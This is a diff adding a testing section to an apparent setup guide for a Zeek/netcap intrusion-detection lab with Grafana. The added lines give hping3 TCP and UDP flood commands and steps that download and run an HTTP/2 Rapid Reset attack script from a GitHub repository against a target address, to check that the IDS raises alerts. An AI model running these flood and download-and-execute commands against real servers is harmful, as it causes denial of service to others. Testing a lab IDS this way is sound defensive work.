@@ -441,3 +441,43 @@ apt-get install grafana=11.1.0
 systemctl enable grafana-server
 systemctl start grafana-server
 ```
+
+
+#### Run tests 
+
+Testing Zeek:
+```
+#Test TCP Flood
+sudo hping3 --flood <ip_of_remote_server>
+
+#Test UDP Flood
+sudo hping3 --udp --flood <ip_of_remote_server>
+
+#Test HTTP Flood with HTTP Rapid Reset
+wget https://github.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/raw/main/dos_script/rapidresetclient 
+wget https://raw.githubusercontent.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/main/dos_script/attack.sh
+chmod +x attack.sh
+chmod +x rapidresetclient
+./attack.sh -u https://<ip_of_remote_vm>:443 -r 1000
+```
+
+!!! I strongly advise not to overload the netcap IDS system if the alertmanager rules are not working, I recommend:
+```
+sudo systemctl restart netcap
+```
+
+Run Test if u're using netcap:
+```
+#Для тестирования TCP Flood
+sudo hping3 -i u5000 192.168.0.102
+
+#Для тестирования Udp Flood
+sudo hping3 --udp  -i u1000 192.168.0.102
+
+#Test HTTP Flood with HTTP Rapid Reset
+wget https://github.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/raw/main/dos_script/rapidresetclient 
+wget https://raw.githubusercontent.com/Millen93/HTTP-2.0-Rapid-Reset-Attack-Laboratory/main/dos_script/attack.sh
+chmod +x attack.sh
+chmod +x rapidresetclient
+./attack.sh -u https://<ip_of_remote_vm>:443 -r 1000
+```
